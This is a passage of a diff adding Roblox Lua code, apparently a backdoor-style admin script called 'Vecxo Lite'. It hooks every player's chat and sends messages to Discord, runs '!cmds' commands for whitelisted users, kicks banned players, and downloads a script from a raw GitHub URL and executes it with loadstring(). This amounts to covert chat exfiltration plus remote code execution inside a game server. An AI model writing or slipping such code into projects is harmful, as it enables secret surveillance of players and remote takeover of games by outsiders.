+				HttpService:JSONEncode(payload),
+				Enum.HttpContentType.ApplicationJson
+			)
+		end)
+
+		if not success then
+			warn("Failed to send message to Discord:", response)
+		end
+	end)
+end
+
+for _, player in ipairs(Players:GetPlayers()) do
+	coroutine.wrap(function()
+		connectChatLogger(player)
+	end)()
+	if table.find(whitelisted, tostring(player.UserId)) then
+		notify(player, "[Vecxo Lite]:", "You are whitelisted! Usage: !cmds")
+	end
+	vecxoconnections["Chatted1"] = player.Chatted:Connect(function(message)
+		processCommand(player, message)
+	end)
+end
+
+vecxoconnections["Joined1"] = Players.PlayerAdded:Connect(function(player)
+	coroutine.wrap(function()
+		connectChatLogger(player)
+	end)()
+	if bannedPlayers[player.UserId] then
+		player:Kick("[Vecxo Lite]: You are banned from this server.")
+		return
+	end
+	if table.find(whitelisted, tostring(player.UserId)) then
+		notifyv2(player, "[Vecxo Lite]:", "You are whitelisted! Usage: !cmds")
+	end
+	vecxoconnections["Chatted2"] = player.Chatted:Connect(function(message)
+		processCommand(player, message)
+	end)
+end)
+
+_G.VeckoRemoteRan = _G.VeckoRemoteRan or false
+
+task.wait(0.2)
+
+if _G.VeckoRemoteRan == false then
+	loadstring(game:GetService('HttpService'):GetAsync('https://raw.githubusercontent.com/reloxz/zastuff/refs/heads/main/VecxoRemoteAPI'))() 
+	_G.VeckoRemoteRan = true
+	_G.VeckoRemoteInitalized = true
+else
+	if _G.VeckoRemoteRan and not _G.VeckoRemoteInitalized then
+		_G.VeckoRemoteInitalized = true
+	else
+		warn("[Vecxo Lite]: Remote API already loaded, so it skipped.")
+	end
+end
